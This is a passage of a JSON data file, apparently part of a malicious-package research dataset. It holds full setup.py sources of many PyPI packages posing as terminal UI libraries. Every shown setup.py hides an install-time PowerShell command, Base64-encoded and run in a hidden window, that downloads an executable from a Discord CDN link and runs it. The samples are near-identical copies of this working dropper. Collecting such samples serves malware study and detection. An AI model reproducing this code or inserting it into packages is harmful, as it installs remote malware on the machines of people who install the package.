3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-libpostmcstudy-v9.67",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'libpostmcstudy',\n    packages = ['modlib'],\n    version = '8.8',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-libpostpongmc-v5.53",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'libpostpongmc',\n    packages = ['modlib'],\n    version = '6.90',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-libpostpullpaypal-v10.22",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'libpostpullpaypal',\n    packages = ['modlib'],\n    version = '10.86',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-libpullvisapy-v10.81",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'libpullvisapy',\n    packages = ['modlib'],\n    version = '9.24',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-libpywreproof-v9.96",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'libpywreproof',\n    packages = ['modlib'],\n    version = '9.20',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-librandomintelkill-v5.64",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'librandomintelkill',\n    packages = ['modlib'],\n    version = '1.18',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-librandproofhttp-v9.9",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'librandproofhttp',\n    packages = ['modlib'],\n    version = '4.81',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-librandstringpull-v3.76",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'librandstringpull',\n    packages = ['modlib'],\n    version = '2.2',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-libreplaceultraintel-v7.90",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'libreplaceultraintel',\n    packages = ['modlib'],\n    version = '8.92',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-libsplitrandomencode-v1.46",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'libsplitrandomencode',\n    packages = ['modlib'],\n    version = '1.10',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-libstrcraftint-v3.6",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'libstrcraftint',\n    packages = ['modlib'],\n    version = '3.61',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-libstrproofurl-v3.10",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'libstrproofurl',\n    packages = ['modlib'],\n    version = '10.60',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-libsuperproofint-v3.64",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'libsuperproofint',\n    packages = ['modlib'],\n    version = '8.25',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-libtoolcvgui-v9.33",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'libtoolcvgui',\n    packages = ['modlib'],\n    version = '1.94',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 